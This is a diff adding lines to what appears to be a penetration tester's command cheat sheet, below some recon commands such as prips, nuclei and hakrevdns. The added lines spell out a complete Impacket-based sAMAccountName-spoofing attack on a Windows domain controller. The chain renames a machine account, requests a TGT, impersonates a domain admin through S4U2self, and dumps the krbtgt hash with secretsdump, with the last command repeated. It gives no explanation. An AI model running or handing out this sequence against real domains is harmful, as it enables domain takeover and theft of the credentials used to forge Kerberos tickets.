@@ -316,4 +316,10 @@ prips -i4 192.168.0.10 192.168.0.250
 prips 173.0.84.0/24 | hakrevdns
 nuclei -u https://example.com
 ntpdate -u 192.168.56.101
+renameMachine.py -current-name "testcomputer$" -new-name "DC01" -dc-ip dc01 "domain"/"user1":"complexpassword"
+getTGT.py -dc-ip dc01 "domain.local"/"DC01":"123pentest"
+renameMachine.py -current-name "DC01" -new-name "testcomputer$" -dc-ip dc01 "domain"/"user1":"complexpassword"
+KRB5CCNAME="DC01.ccache" getST.py -self -impersonate "domainadmin" -spn "cifs/dc01.domain.local" -k -no-pass -dc-ip dc01 "domain.local"/"dc01"
+KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
+KRB5CCNAME="domainadmin.ccache" secretsdump -just-dc-user "krbtgt" -dc-ip dc01 -k -no-pass @"dc01.domain.local"
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
